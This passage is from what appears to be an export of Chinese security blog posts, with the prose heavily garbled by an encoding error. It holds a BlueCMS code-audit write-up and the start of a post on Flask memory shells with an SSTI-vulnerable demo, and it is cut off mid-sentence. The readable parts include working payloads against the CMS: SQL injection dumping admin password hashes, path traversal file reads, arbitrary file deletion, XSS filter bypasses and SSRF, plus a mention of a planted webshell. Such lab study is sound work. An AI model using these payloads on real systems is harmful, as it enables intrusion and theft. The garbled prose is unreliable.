ã€‚ä¸è¿‡æˆ‘ä»¬çŸ¥é“postä¼ å…¥çš„æ•°æ®ä¼šè¢«addslasheså‡½æ•°è¿‡æ»¤ï¼Œä½†å› ä¸ºæ˜¯GBKç¼–ç ï¼Œæ‰€ä»¥å¯ä»¥å®½å­—èŠ‚ç»•è¿‡ã€‚å¦‚ä¸‹å›¾ï¼ŒæˆåŠŸç™»å½• ç¼–è¾‘ä¼šå‘˜sqlæ³¨å…¥ è¿™é‡Œä¹Ÿæ˜¯å¶ç„¶çœ‹åˆ°çš„ï¼Œçœ‹æ–‡ç« è¯´è¿™é‡Œå­˜åœ¨æŸä¸ªå®½å­—èŠ‚æ³¨å…¥ï¼Œä½†æ˜¯æ²¡æ‰¾åˆ°ï¼Œå€’æ˜¯æ‰¾åˆ°äº†è”åˆæ³¨å…¥ï¼š/admin/user.php é€šè¯»ä¸€éä»£ç å°±çŸ¥é“è¿™é‡Œå¯ç–‘äº†ï¼Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œå› ä¸ºä¸éœ€è¦å•å¼•å·ï¼Œå› æ­¤è¿™ä¸ªaddslasheså‡½æ•°çš„è¿‡æ»¤ä¹Ÿå°±æ²¡ç”¨äº†ï¼Œè¿™é‡Œæ˜¯æ•°å­—å‹æ³¨å…¥ http://127.0.0.1/bluecms/admin/user.php?act=edit&amp;user_id=-1 union select 1,2,3,user(),5,6,7,8,9,10,11,12,version(),group_concat(pwd),15,16,17 from blue_admin%23 åå°å¯¼èˆªsqlæ³¨å…¥ æ ¹æ®seayå®šä½åˆ°è¿™é‡Œï¼Œç„¶åç›´æ¥æ•°å­—å‹æ³¨å…¥å³å¯ http://127.0.0.1/bluecms/admin/nav.php?act=edit&amp;navid=1 union select 1,2,user(),version(),group_concat(pwd),6 from blue_admin åå°å±æ€§åˆ—è¡¨sqlæ³¨å…¥ è¿™ä¸ªç‚¹ä¹Ÿå¾ˆç–‘æƒ‘ï¼Œä¹Ÿè¯´æ˜äº†ï¼Œæˆ‘æ‰‹å·¥æ³¨å…¥æœ‰ç‚¹åƒåœ¾å•Šã€‚è¿™ä¸ªæ˜¯çœ‹çš„æ–‡ç« äº†è§£åˆ°çš„ã€‚ é¦–å…ˆå®šä½åˆ°admin/attachment.phpï¼Œå‘ç°ä¸‹å›¾ä½ç½®å­˜åœ¨sqlæ³¨å…¥ï¼Œå› ä¸ºè¿™é‡Œå¯¹att_idå‚æ•°æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œæˆ‘ä»¬ç›´æ¥è¾“å…¥å³å¯ æˆ‘å¼€å§‹çš„payloadä¸ºï¼š http://127.0.0.1/bluecms/admin/attachment.php?act=del&amp;att_id=updatexml(1,concat(0x7e,database()),1) ä½†æ˜¯é¡µé¢åªè¯´è¯­æ³•é”™è¯¯ï¼Œä½†æˆ‘ä¸ç†è§£ä¸ºä½•å‡ºä¸æ¥ä¿¡æ¯ æˆ–è®¸åˆæ˜¯è·Ÿæˆ‘çš„ç¯å¢ƒæœ‰å…³ ä½†å½“æˆ‘å°è¯•ç”¨sqlmapå»è·‘çš„æ—¶å€™ï¼Œå‘ç°å»¶æ—¶æ³¨å…¥æ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œå®ƒä½¿ç”¨çš„payloadå¦‚ä¸‹ï¼š att_id=(SELECT 4477 FROM (SELECT(SLEEP(5)))tVeo) ç±»ä¼¼çš„ä¸‹é¢è¿™ä¸€ä¸ªåœ°æ–¹ï¼Œä¹Ÿæ˜¯è·Ÿä¸Šè¿°å·®ä¸å¤š/admin/ad.php ä»»æ„æ–‡ä»¶è¯»å– è¿™é‡Œæ ¹æ®æ–‡ç« æ‰€è¯´ï¼š/admin/tpl_manage.phpä¸­å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼Œæˆ‘ä»¬åŒæ—¶å¯ä»¥ç»“åˆseayèƒ½çœ‹åˆ°æ•æ„Ÿå‡½æ•°çš„ä½ç½® å®šä½åˆ°ä¸‹å›¾ï¼Œèƒ½çœ‹åˆ°å¯¹ä¼ å…¥çš„å‚æ•°tpl_nameæ²¡æœ‰è¿‡æ»¤ï¼Œè¿™é‡Œçš„blue_rootå°±æ˜¯æ ¹ç›®å½•ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬åªéœ€è¦å‘ä¸Šè·³ä¸¤çº§å³å¯æ ¹æ®å„ä¸ªæ–‡ä»¶çš„ä½ç½®ï¼Œä»»æ„è¯»æ–‡ä»¶äº† å¦‚ä¸‹å›¾ï¼šhttp://127.0.0.1/bluecms/admin/tpl_manage.php?act=edit&amp;tpl_name=../../index.php ä»»æ„æ–‡ä»¶å†™å…¥ è¿™é‡Œå½“æ—¶æ²¡æ³¨æ„ï¼Œç›´æ¥çœ‹äº†æ–‡ç« çš„æ€è·¯äº†ã€‚ æˆ‘ä»¬åœ¨åˆšåˆšçš„ä»£ç å¤„å¾€ä¸‹çœ‹ï¼Œå°±çŸ¥é“ å®ƒå°†æ–‡ä»¶è¾“å…¥çš„å†…å®¹è¿›è¡Œdeep_stripslashesçš„å¤„ç†äº†ï¼Œç„¶åå°±æ ¹æ®å®šä¹‰çš„æ–‡ä»¶è·¯å¾„ï¼Œå†™å…¥è¯¥æ–‡ä»¶ï¼Œæˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹è¿™ä¸ªå‡½æ•°çœ‹çœ‹ è¿™é‡Œæ— éå°±æ˜¯è°ƒç”¨PHPè‡ªå¸¦çš„stripslasheså‡½æ•°ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™ä¸ªå‡½æ•°çš„ä½œç”¨ è¿™é‡Œçªç„¶å°±èƒ½è”æƒ³åˆ°ï¼Œè¿™ä¸ªCMSå¯¹å…¨å±€çš„postå‚æ•°è¿˜åšäº†æŸä¸ªè¿‡æ»¤ï¼Œå°±æ˜¯addslashesï¼Œæˆ‘ä»¬çŸ¥é“è¿™ä¸ªå‡½æ•°æ˜¯è½¬ç§»å•å¼•å·è¿™äº›å­—ç¬¦ï¼Œè€Œstripslashesæ°æ°ç›¸åï¼Œæ˜¯å»é™¤è¿™äº›è½¬ç§»ç¬¦å·ï¼Œè¿™ç›¸å½“äºæ²¡æœ‰è¿‡æ»¤ï¼ï¼ é‚£æˆ‘ä»¬ç›´æ¥æ ¹æ®ä»£ç å†™å…¥æ–‡ä»¶å³å¯ èšå‰‘è¿æ¥ä¹ŸæˆåŠŸ ä»»æ„æ–‡ä»¶åˆ é™¤ ç¬¬ä¸€å¤„ è¿™é‡Œä¹Ÿæ˜¯çœ‹æ–‡ç« å¾—åˆ°çš„ï¼Œä¹‹å‰ä¹Ÿæ³¨æ„è¿‡ï¼Œä¸è¿‡å¿½ç•¥äº†ï¼ˆå› ä¸ºæŸäº›åŸå› ï¼‰ é¦–å…ˆæ ¹æ®seayä»£ç å®¡è®¡ç³»ç»Ÿï¼ŒçŸ¥é“åœ¨user.phpçš„ä½ç½®å­˜åœ¨unlinkå‡½æ•°ï¼Œå¯èƒ½ä¼šæœ‰ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´ï¼Œæˆ‘ä»¬è·Ÿè¿›çœ‹çœ‹ï¼Œç¬¬ä¸€ä¸ªå°±æ˜¯æ–‡ç« æ‰€è¯´çš„ åœ¨è¿™é‡Œæ˜¯å½“actç­‰äºè¿™ä¸ªå€¼çš„æ—¶å€™ï¼Œæ¥å—ä¸€ä¸ªidå‚æ•°ï¼Œç„¶åsqlè¿›å…¥æ•°æ®åº“æŸ¥è¯¢ï¼Œä¹‹åå¦‚æœï¼Œå¯¹åº”çš„æ–‡ä»¶å­˜åœ¨çš„è¯ï¼Œå°±åˆ é™¤ï¼Œå¾ˆæ˜æ˜¾ã€‚è¿™é‡Œæ²¡æœ‰å¯¹idè¿›è¡Œä»»ä½•è¿‡æ»¤ï¼Œæˆ‘ä»¬ç›´æ¥éå†çš„è¯å°±èƒ½åˆ é™¤ä»»æ„æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•åˆ é™¤ã€‚ å¯ä»¥çœ‹åˆ°æŠ±é”™ï¼Œè¿™é‡ŒåŸå› åœ¨äºæ•°æ®åº“åˆå§‹åŒ–çš„æ—¶å€™ï¼Œå¹¶æ²¡æœ‰conpany_imageè¿™ä¸ªè¡¨ï¼Œå¯¼è‡´è¿™é‡ŒæŠ±é”™ï¼Œä½†å¦‚æœè¿™ä¸ªè¡¨å­˜åœ¨çš„è¯ï¼Œæ˜¯ä¸ä¼šå½±å“åç»­unlinkçš„æ‰§è¡Œçš„ï¼Œæˆ‘ä»¬ä¸å¦¨æ³¨é‡Šä¸€ä¸‹ï¼Œæµ‹è¯•ã€‚ http://127.0.0.1/bluecms/user.php?act=del_pic&amp;id=templates/default/shell.php å¦‚ä¸Šå›¾ï¼Œå‘ç°åˆ é™¤æˆåŠŸã€‚ ç¬¬äºŒå¤„ æˆ‘ä»¬å…ˆåˆ›å»ºä¸€ä¸ªæµ‹è¯•æ–‡ä»¶ï¼Œç„¶åç»§ç»­è·Ÿè¸ªunlinkçš„è°ƒç”¨ï¼Œåˆ°äº†ä¸‹é¢è¿™é‡Œ è¿™é‡Œçš„è°ƒç”¨æ˜¯å½“act=edit_user_infoçš„æ—¶å€™ï¼Œå¹¶ä¸”åªè¦face_pic1ä¸ºç©ºï¼Œå°±åˆ°äº†ä¸‹é¢çš„elseä»£ç å—ï¼Œç„¶åæˆ‘ä»¬åªéœ€è¦ç»™face_pic3èµ‹å€¼å³å¯ï¼ˆä¾æ—§æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼‰ æœ€ç»ˆæ‰§è¡Œï¼Œå‘ç°æ–‡ä»¶æˆåŠŸåˆ é™¤ ç¬¬ä¸‰å¤„ æˆ‘ä»¬ç»§ç»­å¾€ä¸Šè·Ÿè¸ªï¼Œå¯ä»¥çœ‹åˆ°ä¸‹é¢è¿™é‡Œä¾æ—§æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œç„¶åè°ƒç”¨åˆ°è¿™ä¸€å—ä»£ç ä¹Ÿå¾ˆç®€å•ï¼Œå¾€ä¸Šèµ°ï¼Œç„¶åæ»¡è¶³å„ä¸ªå¿…è¦çš„å‚æ•°çš„å­˜åœ¨å³å¯ payloadå¦‚ä¸‹ï¼šå¦‚å›¾æ‰€ç¤ºï¼Œé™¤äº†æ–‡ä»¶è·¯å¾„ä¹‹å¤–ï¼Œå…¶ä»–å‚æ•°éƒ½æ˜¯å¿…è¦çš„ï¼Œæ‰§è¡Œåæˆ‘ä»¬å‘ç°æˆåŠŸåˆ é™¤æ–‡ä»¶ ä»»æ„æ–‡ä»¶åŒ…å« è¿™é‡Œæ²¡æœ‰å¤ç°æˆåŠŸï¼Œæ„Ÿè§‰æ˜¯æˆ‘è‡ªèº«ç¯å¢ƒçš„é—®é¢˜å§ã€‚æˆ‘ä»¬å…ˆçœ‹æ¼æ´ç‚¹ æœå¯»user.phpä¸‹çš„includeå‡½æ•°ï¼Œå‘ç°åªæœ‰ä¸‹å›¾ä½ç½®ä¸­ï¼Œå­˜åœ¨å¯æ§çš„å¯èƒ½æ€§ï¼Œåªè¦æˆ‘ä»¬é€‰æ‹©act=payç„¶åï¼Œç»™payä¼ å‚è¿›è¡Œç›®å½•éå†ï¼Œå³å¯åŒ…å«ä»»æ„å‡½æ•° ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œåé¢æœ‰index.phpçš„åç¼€å­˜åœ¨ï¼Œæ€è·¯ä¸€èˆ¬ä¼šæœ‰%00æˆªæ–­ï¼Œæˆ–è€…ä¾é ç³»ç»Ÿæ–‡ä»¶è·¯å¾„é•¿åº¦é™åˆ¶ Windows 259ä¸ªå­—èŠ‚ Linux 4096ä¸ªå­—èŠ‚ å› ä¸ºè¿™é‡Œç‰ˆæœ¬5.4.45ï¼Œé‚£è‚¯å®šä¸æ˜¯00æˆªæ–­ï¼Œå› æ­¤ä¼šå°è¯•é•¿åº¦æˆªæ–­ï¼Œè¿™é‡Œæ— éå°±æ˜¯è¿™æ ·çš„payloadï¼Œåé¢ä¸€å †.æ¥æˆªæ–­ï¼Œä½†æ˜¯æˆ‘å´ä¸èƒ½å¤ç°å‡ºæ¥ï¼ŒçŒœæµ‹æ˜¯æŸäº›ç¯å¢ƒé…ç½®çš„é—®é¢˜ï¼Œå¯¼è‡´æˆ‘å½“å‰çš„NTFSæ–‡ä»¶ç³»ç»Ÿä¾æ—§å¯ä»¥å¤„ç†è¿™æ ·é•¿åº¦çš„è·¯å¾„ã€‚ã€‚ã€‚ è¿™é‡Œå¦‚æœæˆåŠŸçš„è¯ï¼Œæ‰¾ä¸€ä¸‹å“ªé‡Œå¯ä»¥ä¸Šä¼ ï¼Œé…åˆå›¾ç‰‡é©¬å³å¯ è¡¥å……ä¸€ä¸‹ï¼Œçªç„¶å‘ç°ä¸€ç¯‡æ–‡ç« è¯´äº†ç±»ä¼¼çš„é—®é¢˜ï¼Œä»–æ˜¯è¿™æ ·è¯´çš„ï¼š ç„¶åä»–å°è¯•äº†5.2.17çš„ç‰ˆæœ¬ï¼Œç„¶åæˆåŠŸäº†ï¼Œä½†æˆ‘åœ¨å¤ç°çš„æ—¶å€™è¿˜æ˜¯æ²¡æˆåŠŸï¼Œä¼°è®¡å°±æ˜¯ç¯å¢ƒæ¯æ­å¥½ï¼Œæˆ–è€…æ˜¯åˆå˜åŒ–äº†ã€‚ä¸‹é¢æ˜¯å®ƒæˆåŠŸçš„æˆªå›¾ XSSæ¼æ´ ç¬¬ä¸€å¤„ ä¾æ—§æ˜¯åœ¨user.phpä¸­ï¼Œæ‰¾trimå‡½æ•°ï¼Œè·Ÿè¸ªå‘ç°å¦‚ä¸‹å›¾çš„åœ°æ–¹ï¼Œå­˜åœ¨å¯ä»¥åœ°æ–¹ï¼Œä»–å¯¹å¤§éƒ¨åˆ†å‚æ•°åªè¿›è¡Œäº†trimçš„å¤„ç†ï¼Œå¾ˆæ˜æ˜¾ï¼Œå¦‚æœè¯¥å‚æ•°å‚ä¸äº†å‰ç«¯çš„æ¸²æŸ“ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€ æˆå­˜å‚¨å‹xss è¿™é‡Œæµ‹è¯•äº†ä¸€ç•ªï¼Œå‘ç°åªæœ‰é‚®ä»¶åœ°å€è¿™é‡Œå¯ä»¥ç”Ÿæ•ˆ ç¬¬äºŒå¤„ è¿™ä¸€ä¸ªåœ°æ–¹ä¹Ÿæ˜¯åˆšåˆšå…³æ³¨äº†ï¼Œä½†æ˜¯ä»¥ä¸ºè¿‡æ»¤çš„æ²¡æ¯›ç—…ï¼Œæˆ‘å°±è®¤ä¸ºæ²¡åˆ©ç”¨ç‚¹äº†ã€‚ã€‚ã€‚ å¦‚ä¸Šå›¾çš„åœ°æ–¹ï¼Œè¿™é‡Œä¾æ—§æ˜¯user.phpï¼Œç„¶åè¿™é‡Œå¹¶æ²¡æœ‰å¯¹contentå’Œdescriptè¿™ä¸¤ä¸ªå‚æ•°åšå‡ºå®ä½“è½¬ä¹‰ï¼Œè¿™æ„å‘³ç€æœ‰å¯èƒ½é€ æˆxssï¼Œæˆ‘ä»¬è·Ÿè¸ªä¸€ä¸‹è¿™ä¸¤ä¸ªå˜é‡ å…¶ä¸­contentå‚æ•°åšäº†è¿‡æ»¤ï¼Œè¿™é‡Œçš„æ­£åˆ™ä¹Ÿå°±æ˜¯åŒ¹é…å½¢å¦‚&lt;script&gt;ã€&lt;iframe&gt;ã€&lt;frame&gt;ã€&lt;meta&gt;çš„è¿™ç±»æ ‡ç­¾ è¿™é‡Œæ˜¯å¯ä»¥ç»•è¿‡çš„ï¼Œæ¯”å¦‚imgæ ‡ç­¾æˆ–è€…æ˜¯åŒå†™ç»•è¿‡ï¼ˆè¿™é‡Œä¼¼ä¹å¿…é¡»æŠ“åŒ…æ”¹ï¼‰ &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scri&lt;script&gt;pt&gt; //æˆ–è€…å¤§å†™ç»•è¿‡ &lt;img src=1 onerror=alert(1)&gt; ç¬¬ä¸‰å¤„ ä¸ä¸Šé¢ä¸€æ ·ï¼Œéœ€è¦åœ¨bpæäº¤ï¼Œä»–å‰ç«¯æœ‰æ£€æµ‹çš„ä»£ç ï¼Œç›´æ¥å†™å…¥ï¼Œä¼šè¢«è½¬ä¹‰ æ¼æ´ç‚¹è¿˜æ˜¯user.phpä¸­çš„ç”¨æˆ·æ³¨å†Œéƒ¨åˆ†ï¼Œåˆ©ç”¨ç‚¹å°±æ˜¯emailè¿™ä¸ªåœ°æ–¹ï¼Œæ²¡æœ‰è¿›è¡Œå®ä½“è½¬ä¹‰ ç„¶åç›´æ¥è®¿é—®user.phpå³å¯ åŒæ—¶è¿™é‡Œåœ¨æµ‹è¯•çš„æ—¶å€™ï¼Œå‘ç°è¿˜å­˜åœ¨éªŒè¯ç å¤ç”¨çš„é—®é¢˜ã€‚ SSRFæ¼æ´ å®šä½åˆ°/user.phpï¼Œè¿™é‡Œçš„face_pic1çš„ï¼Œå¯¹äºhttpå’Œhttpsåè®®çš„æ£€æµ‹ï¼Œé‡‡ç”¨çš„æ˜¯å¼±æ¯”è¾ƒç±»å‹ æˆ‘ä»¬çŸ¥é“è¿™ä¸ªå‡½æ•°stropsè¿”å›çš„æ˜¯ï¼Œå­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå‡å¦‚æˆ‘ä»¬ç»™face_picä¼ å€¼ä¸ºhttp://xxxï¼Œé‚£ç»è¿‡è¿™ä¸ªå‡½æ•°ï¼Œè¿”å›çš„è‚¯å®šå°±æ˜¯0ï¼ˆé¦–æ¬¡å‡ºç°çš„åœ°æ–¹å°±æ˜¯0ï¼‰ï¼Œä½†ç”±äºæ˜¯å¼±æ¯”è¾ƒç±»å‹ï¼Œæ•…0!=falseå¾ˆæ˜æ˜¾è¿”å›çš„æ˜¯falseï¼Œæ•…ä¼šæˆåŠŸèµ‹å€¼ç»™ä¸‹é¢çš„face_picå˜é‡ æ¥ä¸‹æ¥çœ‹ä¸€ä¸‹å“ªé‡Œè°ƒç”¨è¿‡è¿™ä¸ªface_picå˜é‡ï¼Œ ä¹Ÿå°±æ˜¯ä¸‹é¢çš„è¿™é‡Œå°†face_picå½“ä½œäº†ä¸Šä¼ çš„è·¯å¾„ï¼Œimg_uploadå‡½æ•°å°±æ˜¯ç”¨æ¥ä¸Šä¼ å¤´åƒçš„ï¼Œä¸ä¸Šé¢é…åˆä¹Ÿå°±å½¢æˆäº†ssrfï¼Œæˆ‘ä»¬ç›´æ¥è¾“å…¥å¦‚ä¸‹payload face_pic1=http://127.0.0.1:9999 å¦‚æœè¿™é‡Œçš„stropsæ¢æˆäº†å¼ºç­‰äºï¼Œé‚£å°±æ²¡äº‹å„¿äº†ï¼Œä¸è¿‡åè®®è¿‡æ»¤ä¹Ÿä¸å®Œæ•´ã€‚ 0x05 æ€»ç»“ æ€»ä½“æ„Ÿè§‰ä¸‹æ¥ï¼Œå¯¹æ–°æ‰‹å…¥é—¨æ¥è¯´ï¼Œå®¡è®¡è¿™ä¸ªCMSæ˜¯è›®ç®€å•çš„ã€‚å¯ä»¥è¯´åªè¦seayæ‰«å‡ºæ¥çš„å¯ä»¥æ¼æ´ï¼Œæˆ‘è®¤ä¸ºåŸºæœ¬éƒ½æ˜¯å¯ä»¥æµ‹å‡ºæ¥çš„ã€‚ æˆ‘æ„Ÿè§‰é™¤äº†ä¸Šè¿°ä»‹ç»åˆ°çš„ï¼Œä¾æ—§å­˜åœ¨å…¶ä»–æ¼æ´ï¼Œæ„Ÿè§‰å®¡çš„è¶³å¤Ÿäº†ï¼Œä¹Ÿå°±æ²¡ç»§ç»­äº†ã€‚å¯ä»¥è¯´è‡ªå·±æ‰¾å‡ºæ¥çš„ï¼Œå’Œçœ‹æ–‡ç« æç¤ºçš„ï¼Œ46å¼€å§ã€‚å¯¹äºè¿™ç§ç±»å‹çš„CMSï¼Œæˆ‘æ„Ÿè§‰é¦–å…ˆåˆ¤æ–­å‡ºæ€»ä½“CMSåŠŸèƒ½ç‚¹åœ¨å“ªï¼Œé˜²å¾¡å‡½æ•°åœ¨å“ªï¼Œå…ˆçœ‹é˜²å¾¡ç±»å‡½æ•°æ˜¯å¦åšåˆ°äº†çœŸæ­£çš„é˜²å¾¡ï¼Œç„¶åè½¬åˆ°åŠŸèƒ½ç‚¹ï¼Œè·Ÿç€è‡ªåŠ¨åŒ–å‡ºæ¥çš„æ¼æ´ç‚¹ï¼Œå»ä¸€ä¸ªä¸ªçœ‹ï¼Œæ­£å‘æˆ–è€…é€†å‘è¿½è¸ªå˜é‡ç­‰ç­‰ã€‚ è¿™ç§æ— MVCçš„æ„Ÿè§‰æ— è„‘å®¡éƒ½è¡Œã€‚ç»§ç»­å‹‰åŠ±ä»æœ‰ä¸è¶³ 0x06 å‚è€ƒæ–‡ç«  å¯èƒ½æ˜¯å…¨ç½‘æœ€è¯¦ç»†çš„PhpStorm+xdebugè¿œç¨‹è°ƒè¯•phpä»£ç çš„æ•™ç¨‹ PHPä»£ç å®¡è®¡ä¸€æ¡é¾™æ€è·¯ é€šè¿‡ BlueCMS å­¦ä¹  php ä»£ç å®¡è®¡ ä»å°ä¼—blueCMSå…¥å‘ä»£ç å®¡è®¡ bluecms v1.6 sp1 ä»£ç å®¡è®¡å­¦ä¹  bluecms v1.6 sp1 ä»£ç å®¡è®¡ PHPä»£ç å®¡è®¡å…¥é—¨ç¯‡bluecms","tags":["PHPä»£ç å®¡è®¡"],"categories":["PHPä»£ç å®¡è®¡"]},{"title":"Flaskå†…å­˜é©¬å­¦ä¹ ","path":"/2024/05/26/flask-nei-cun-ma-xue-xi/","content":"0x01 å‰è¨€ å­¦ä¹ çš„åŠ¨æœºæ˜¯H&amp;NCTF2024çš„flaskå†…å­˜é©¬ï¼Œä¹‹å‰ä¹Ÿæ²¡æ¥è§¦è¿‡ï¼Œè¿˜æœ‰å°±æ˜¯é•¿åŸæ¯çº¿ä¸‹åŠå†³èµ›ï¼Œå½“æ—¶ä¹Ÿæ˜¯è®°å¾—ï¼Œæ¯”èµ›åˆšå¼€å§‹ï¼Œå°±è¢«ä½¬çš„é˜Ÿä¼ä¸Šäº†å†…å­˜é©¬ï¼Œå¯¼è‡´è‡ªå·±çš„æœåŠ¡å™¨éƒ½ä¸€ç›´ä¸Šä¸å»ã€‚ã€‚ã€‚ã€‚ æœ¬æ–‡ä¼°è®¡å¾ˆå¤šcvçš„ï¼Œä½†è‚¯å®šéƒ½ä¼šæ€è€ƒå®æ“ä¸€éï¼ŒåŠªåŠ›äº§å‡ºè‡ªå·±çš„æ€è€ƒå’Œè¯­è¨€ï¼ 0x02 åŸç† å¸¸ç”¨çš„Pythonæ¡†æ¶æœ‰Djangoã€Flask, è¿™ä¸¤è€…éƒ½å¯èƒ½å­˜åœ¨SSTIæ¼æ´. Python å†…å­˜é©¬åˆ©ç”¨Flaskæ¡†æ¶ä¸­SSTIæ³¨å…¥æ¥å®ç°, Flaskæ¡†æ¶ä¸­åœ¨webåº”ç”¨æ¨¡æ¿æ¸²æŸ“çš„è¿‡ç¨‹ä¸­ç”¨åˆ°render_template_stringè¿›è¡Œæ¸²æŸ“, ä½†æœªå¯¹ç”¨æˆ·ä¼ è¾“çš„ä»£ç è¿›è¡Œè¿‡æ»¤å¯¼è‡´ç”¨æˆ·å¯ä»¥é€šè¿‡æ³¨å…¥æ¶æ„ä»£ç æ¥å®ç°Pythonå†…å­˜é©¬çš„æ³¨å…¥ã€‚ 0x03 å‰ç½®çŸ¥è¯† Flaskä¸Šä¸‹æ–‡ç®¡ç†æœºåˆ¶ å…ˆè¯´ç»“è®ºï¼š å½“ç½‘é¡µè¯·æ±‚è¿›å…¥Flaskæ—¶, ä¼šå®ä¾‹åŒ–ä¸€ä¸ªRequest Contextã€‚åœ¨Pythonä¸­åˆ†å‡ºäº†ä¸¤ç§ä¸Šä¸‹æ–‡: è¯·æ±‚ä¸Šä¸‹æ–‡(request context)ã€åº”ç”¨ä¸Šä¸‹æ–‡(session context). ä¸€ä¸ªè¯·æ±‚ä¸Šä¸‹æ–‡ä¸­å°è£…äº†è¯·æ±‚çš„ä¿¡æ¯, è€Œä¸Šä¸‹æ–‡çš„ç»“æ„æ˜¯è¿ç”¨äº†ä¸€ä¸ªStackçš„æ ˆç»“æ„, ä¹Ÿå°±æ˜¯è¯´å®ƒæ‹¥æœ‰ä¸€ä¸ªæ ˆæ‰€æ‹¥æœ‰çš„å…¨éƒ¨ç‰¹æ€§. request contextå®ä¾‹åŒ–åä¼šè¢«pushåˆ°æ ˆ_request_ctx_stackä¸­, åŸºäºæ­¤ç‰¹æ€§ä¾¿å¯ä»¥é€šè¿‡è·å–æ ˆé¡¶å…ƒç´ çš„æ–¹æ³•æ¥è·å–å½“å‰çš„è¯·æ±‚. æ¥ä¸‹æ¥å†™ä¸ªç®€å•demo from flask import Flask, request, render_template_string app = Flask(__name__) @app.route('/') def home(): person = 'guest' if request.args.get('name'): person = request.args.get('name') template = '&lt;h2&gt;Hello %s!&lt;/h2&gt;' % person return render_template_string(template) if __name__ == \"__main__\": app.run() åœ¨homeå‡½æ•°é‡Œä¸‹ä¸ªæ–­ç‚¹ï¼Œå¼€å§‹è°ƒè¯•ï¼Œæ¥æ”¶åˆ°é¡µé¢ä¼ æ¥çš„å‚æ•°ä¹‹åï¼Œå½“å‰æ ˆç»“æ„å¦‚ä¸‹ï¼Œè¿™é‡Œæœ‰çš„äººè¯´ï¼š flaskåœ¨æ¥å—åˆ°è¯·æ±‚çš„æ—¶å€™ä¼šè°ƒç”¨appçš„__call__æ–¹æ³• ä½†æˆ‘ä¹Ÿä¸æ¸…æ¥šå…·ä½“æ˜¯å¦‚ä½•å°±è°ƒç”¨äº†ï¼Œåªèƒ½æ ¹æ®ä¸‹å›¾çš„æ ˆç»“æ„åˆ†æï¼Œåœ¨__call__æ–¹æ³•å‰ï¼Œå…ˆæ˜¯ä¸€äº›å¤„ç†requestè¯·æ±‚çš„å‡½æ•°ï¼Œæ¥ä¸‹æ¥æ‰æ˜¯callï¼Œç„¶åè·Ÿç€æ–‡ç« èµ°ä¸€ä¸‹ tipsï¼šä»£ç å®¡è®¡ä¹Ÿæ²¡å­¦è¿‡ï¼Œåªèƒ½ç…§çŒ«ç”»è™äº† ç»§ç»­è·Ÿè¿›å°±æ¥åˆ°äº†è¿™é‡Œ æ®æ–‡ç« è¯´ï¼šè¿™é‡Œselfæ˜¯å½“å‰Flaskå¯¹è±¡ï¼Œç„¶åè°ƒç”¨request_contextæ–¹æ³•ï¼Œå¾—åˆ°ä¸€ä¸ªRequestContext ç»§ç»­çœ‹ä¸€ä¸‹ctxçš„å…·ä½“å†…å®¹ï¼Œå¦‚ä¸‹å›¾å¯ä»¥çœ‹åˆ°åŒ…å«äº†å½“å‰çš„requestå’Œsessionç­‰ ç»§ç»­è·Ÿè¿›åˆ°äº†ctxè°ƒç”¨äº†push ä¸»è¦å°±æ˜¯å°è¯•è·å–å½“å‰ä¸Šä¸‹æ–‡ï¼Œç„¶åifè¯­å¥åˆ¤æ–­ï¼Œå¦‚æœæ²¡æœ‰åº”ç”¨ä¸Šä¸‹æ–‡ï¼Œæˆ–è€…å½“å‰ä¸Šä¸‹æ–‡çš„åº”ç”¨ä¸è¯·æ±‚çš„åº”ç”¨ä¸åŒï¼Œåˆ™åˆ›å»ºä¸€ä¸ªæ–°çš„åº”ç”¨ä¸Šä¸‹æ–‡ï¼Œå¹¶å°†å…¶æ¨å…¥ä¸Šä¸‹æ–‡å †æ ˆã€‚ ç„¶åå°†å½“å‰è¯·æ±‚ä¸Šä¸‹æ–‡å’Œå¯èƒ½çš„åº”ç”¨ä¸Šä¸‹æ–‡ä½œä¸ºä¸€ä¸ªå…ƒç»„ï¼Œæ·»åŠ åˆ° _cv_tokens åˆ—è¡¨ä¸­ã€‚ ä¸‹é¢çš„å†…å®¹ï¼Œæˆ‘è°ƒè¯•å°±æ‰¾ä¸åˆ°äº†ï¼Œå°±ç›´æ¥çœ‹å§ï¼šä¸Šä¸‹æ–‡æœ‰å…³çš„å†…å®¹å®šä¹‰åœ¨ globals.py æ–‡ä»¶ï¼Œæ–‡ä»¶çš„å†…å®¹ä¹Ÿéå¸¸çŸ­ï¼š def _lookup_req_object(name): top = _request_ctx_stack.top if top is None: raise RuntimeError(_request_ctx_err_msg) return getattr(top, name) def _lookup_app_object(name): top = _app_ctx_stack.top if top is None: raise RuntimeError(_app_ctx_err_msg) return getattr(top, name) def _find_app(): top = _app_ctx_stack.top if top is None: raise RuntimeError(_app_ctx_err_msg) return top.app # context locals _request_ctx_stack = LocalStack() _app_ctx_stack = LocalStack() current_app = LocalProxy(_find_app) request = LocalProxy(partial(_lookup_req_object, 'request')) session = LocalProxy(partial(_lookup_req_object, 'session')) g = LocalProxy(partial(_lookup_app_object, 'g')) å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„_request_ctx_stackå°±æ˜¯ä¸€ä¸ªLocalStackå¯¹è±¡ è¿™é‡Œçš„å®ç°ç”¨åˆ°äº†ä¸¤ä¸ªä¸œè¥¿ï¼šLocalStack å’Œ 